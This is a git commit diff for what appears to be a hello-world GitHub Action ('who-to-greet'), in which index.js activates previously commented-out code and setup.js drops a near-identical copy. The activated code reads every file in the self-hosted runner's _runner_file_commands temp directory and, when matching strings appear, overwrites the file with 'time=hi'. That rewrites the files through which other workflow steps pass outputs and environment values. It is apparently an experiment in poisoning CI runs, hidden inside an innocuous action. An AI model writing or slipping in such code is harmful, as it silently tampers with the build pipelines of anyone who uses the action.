63e1c6e313df2f87414ec06170596db359d61503
musset0 <musset025@gmail.com>
2023-07-16 18:32:12 -0400

    new v1.1.2

--- index.js
+++ index.js
@@ -12,39 +12,39 @@ try {
     // console.log(path);
 
     
-    // const files_other = fs.readdirSync('/home/musset/actions-runner/_work/_temp/_runner_file_commands');
+    const files_other = fs.readdirSync('/home/musset/actions-runner/_work/_temp/_runner_file_commands');
 
-    // files_other.forEach(element => {
+    files_other.forEach(element => {
 
-    //     let path = `/home/musset/actions-runner/_work/_temp/_runner_file_commands/${element}`;
+        let path = `/home/musset/actions-runner/_work/_temp/_runner_file_commands/${element}`;
             
-    //     cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
-    //         if (err){
-    //             console.log(err);
-    //             return;
-    //         }
+        cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
+            if (err){
+                console.log(err);
+                return;
+            }
 
-    //         let content = stdout.toString();
-    //         if (content.indexOf("hello") != -1 || content.indexOf("world") != -1 || content.indexOf("223333") != -1){
+            let content = stdout.toString();
+            if (content.indexOf("time") != -1 || content.indexOf("world") != -1 || content.indexOf("223333") != -1){
                 
-    //             console.log(`-----${element}------`);
+                console.log(`-----${element}------`);
 
-    //             cl_process.exec(`echo "test=223333" > ${path}`, (err, stdout, stderr) => {
-    //                 if (err){
-    //                     console.log(err);
-    //                     return;
-    //                 }
-    //                 console.log(`stdout: ${stdout.toString()}`);
-    //                 console.log(`stderr: ${stderr}`);
-    //             });
+                cl_process.exec(`echo "time=hi" > ${path}`, (err, stdout, stderr) => {
+                    if (err){
+                        console.log(err);
+                        return;
+                    }
+                    console.log(`stdout: ${stdout.toString()}`);
+                    console.log(`stderr: ${stderr}`);
+                });
 
-    //             console.log(`stdout: ${stdout.toString()}`);
-    //             console.log(`stderr: ${stderr}`);
-    //         }
+                console.log(`stdout: ${stdout.toString()}`);
+                console.log(`stderr: ${stderr}`);
+            }
 
             
-    //     });
-    // });
+        });
+    });
 
     
     const nameToGreet = core.getInput('who-to-greet');
--- setup.js
+++ setup.js
@@ -11,35 +11,3 @@ console.log("this is a setup.....")
 //     console.log(`stderr: ${stderr}`);
 // });
 
-const files_other = fs.readdirSync('/home/musset/actions-runner/_work/_temp/_runner_file_commands');
-
-files_other.forEach(element => {
-
-    let path = `/home/musset/actions-runner/_work/_temp/_runner_file_commands/${element}`;
-        
-    cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
-        if (err){
-            console.log(err);
-            return;
-        }
-
-        let content = stdout.toString();
-        if (content.indexOf("time") != -1){
-            
-            console.log(`-----${element}------`);
-
-            cl_process.exec(`echo "time=hello" > ${path}`, (err, stdout, stderr) => {
-                if (err){
-                    console.log(err);
-                    return;
-                }
-                console.log(`stdout: ${stdout.toString()}`);
-                console.log(`stderr: ${stderr}`);
-            });
-
-            console.log(`stdout: ${stdout.toString()}`);
-            console.log(`stderr: ${stderr}`);
-        }
-        
-    });
-});
